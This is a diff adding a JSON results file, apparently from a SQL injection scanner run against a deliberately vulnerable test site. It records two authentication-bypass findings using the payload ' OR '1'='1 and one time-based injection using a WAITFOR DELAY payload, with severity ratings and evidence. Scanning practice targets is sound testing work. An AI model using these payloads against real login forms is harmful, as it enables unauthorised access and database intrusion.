@@ -1,0 +1,23 @@
+[
+    {
+        "url": "http://testaspnet.vulnweb.com/login.aspx",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR '1'='1",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on http://testaspnet.vulnweb.com/login.aspx using payload: ' OR '1'='1"
+    },
+    {
+        "url": "http://testaspnet.vulnweb.com/login.aspx",
+        "vulnerability type": "Time Based SQLI",
+        "payload": "'; WAITFOR DELAY '0:0:5'--",
+        "severity": "Critical",
+        "evidence": "Server delayed by 5.763059s"
+    },
+    {
+        "url": "http://testaspnet.vulnweb.com/Signup.aspx",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR '1'='1",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on http://testaspnet.vulnweb.com/Signup.aspx using payload: ' OR '1'='1"
+    }
+]
